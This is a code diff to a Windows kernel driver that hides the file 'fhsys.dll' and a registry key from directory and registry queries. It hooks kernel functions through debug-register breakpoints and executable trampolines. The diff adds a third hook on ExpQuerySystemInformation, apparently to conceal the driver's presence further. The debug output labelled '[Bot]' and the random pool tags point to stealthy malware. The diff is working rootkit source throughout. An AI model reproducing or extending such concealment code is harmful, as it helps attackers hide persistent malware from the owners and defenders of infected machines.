@@ -9,6 +9,7 @@
 #include "util.h"
 #include "querydir.h"
 #include "enumkey.h"
+#include "querysystem.h"
 
 __declspec(noinline) BOOLEAN fun(int n, int m) {
 	int r;
@@ -29,7 +30,7 @@ __declspec(noinline) void thread(PVOID param) {
 funAddr_t funAddr;
 
 __declspec(noinline) void setDr(PVOID param) {
-	uint64_t dr0, dr1, dr7;
+	uint64_t dr0, dr1, dr2, dr7;
 	LARGE_INTEGER delay;
 	delay.QuadPart = -1;
 	dr7 = __readdr(7);
@@ -42,9 +43,14 @@ __declspec(noinline) void setDr(PVOID param) {
 	dr7 |= 0x1 << 3;
 	dr7 &= ~(0xf << 20);
 
+	dr2 = funAddr.ExpQuerySystemInformation;
+	dr7 |= 0x1 << 5;
+	dr7 &= ~(0xf << 24);
+
 	while (1) {
 		__writedr(0, dr0);
 		__writedr(1, dr1);
+		__writedr(2, dr2);
 		__writedr(7, dr7);
 		KeDelayExecutionThread(UserMode, TRUE, &delay);
 	}
@@ -54,6 +60,7 @@ extern uint32_t drHit;
 
 NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;
 NtEnumerateKey_t origNtEnumerateKey;
+ExpQuerySystemInformation_t origExpQuerySystemInformation;
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	HANDLE han;
@@ -68,7 +75,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	rand_state_t state;
 	hde64s hs;
 	const uint8_t absJmp[] = {0xFF, 0x25, 0x00, 0x00, 0x00, 0x00};
-	uint8_t *tramp, queryDirInst, enumKeyInst;
+	uint8_t *tramp, queryDirInst, enumKeyInst, querySystemInst;
 
 	RtlInitUnicodeString(&hiddenFile, L"fhsys.dll");
 	RtlInitUnicodeString(&hiddenReg, L"fhsys");
@@ -85,7 +92,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	queryDirInst = hde64_disasm(NtQueryDirectoryFileEx, &hs);
 	enumKeyInst = hde64_disasm(funAddr.NtEnumerateKey, &hs);
-	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, (uint64_t)queryDirInst + (uint64_t)enumKeyInst + sizeof(absJmp) * 2 + 8 * 2, rand_tag(&state));
+	querySystemInst = hde64_disasm(funAddr.ExpQuerySystemInformation, &hs);
+	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, (uint64_t)queryDirInst + (uint64_t)enumKeyInst + (uint64_t)querySystemInst + sizeof(absJmp) * 3 + 8 * 3, rand_tag(&state));
 
 	origNtQueryDirectoryFileEx = tramp;
 	memcpy(tramp, NtQueryDirectoryFileEx, queryDirInst);
@@ -101,6 +109,14 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	memcpy(tramp, absJmp, sizeof(absJmp));
 	tramp += sizeof(absJmp);
 	*((uint64_t*)tramp) = funAddr.NtEnumerateKey + (uint64_t)enumKeyInst;
+	tramp += 8;
+
+	origExpQuerySystemInformation = tramp;
+	memcpy(tramp, (PVOID)funAddr.ExpQuerySystemInformation, querySystemInst);
+	tramp += querySystemInst;
+	memcpy(tramp, absJmp, sizeof(absJmp));
+	tramp += sizeof(absJmp);
+	*((uint64_t*)tramp) = funAddr.ExpQuerySystemInformation + (uint64_t)querySystemInst;
 	tramp += 8;
 
 	//KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
@@ -152,6 +168,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	DbgPrintEx(0, 0, "[Bot] Thread %x\n", status);
 
 	//vybral jsem max
+	DbgPrintEx(0, 0, "[Bot] EnumKey %p ExpQuery %p\n", funAddr.NtEnumerateKey, funAddr.ExpQuerySystemInformation);
 	DbgPrintEx(0, 0, "[Bot] Active: %u Max: %u\n", KeQueryActiveProcessorCount(NULL), KeQueryMaximumProcessorCount());
 	DbgPrintEx(0, 0, "[Bot] %p %p\n", __readdr(0), __readdr(7));
 	DbgPrintEx(0, 0, "[Bot] %u\n", fun(4, 5));
